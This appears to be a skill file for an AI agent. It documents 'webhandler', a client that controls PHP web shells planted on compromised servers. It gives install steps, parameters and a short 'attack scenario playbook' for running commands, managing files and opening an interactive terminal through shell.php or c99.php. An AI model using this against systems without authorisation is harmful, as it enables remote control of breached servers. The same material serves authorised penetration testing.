---
name: webhandler-shell
description: "webhandler: WebShell management. Signals: web vulnerabilities, injection, WebShell client, single command, interactive."
zh-signals: "webhandler: WebShell 管理。信号:web漏洞,注入,WebShell 客户端,单命令,交互。"
when-to-use: >-
  Use after gaining WebShell access to manage files, execute commands, and open
  an interactive terminal through a PHP WebShell client.
---

# webhandler

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/lnxg33k/webhandler
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/lnxg33k/webhandler && cd webhandler
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python webhandler.py --url 'https://t.com/shell.php' --password x` | WebShell client |
| `--url url --cmd id` | Single command |
| `--interactive` | Interactive |

## Attack Scenario Playbook

### WebShell management

```bash
python webhandler.py --url 'https://t.com/c99.php' --password pass
# File management + command execution + database
```

## Notes

PHP WebShell client with password authentication and an interactive terminal.
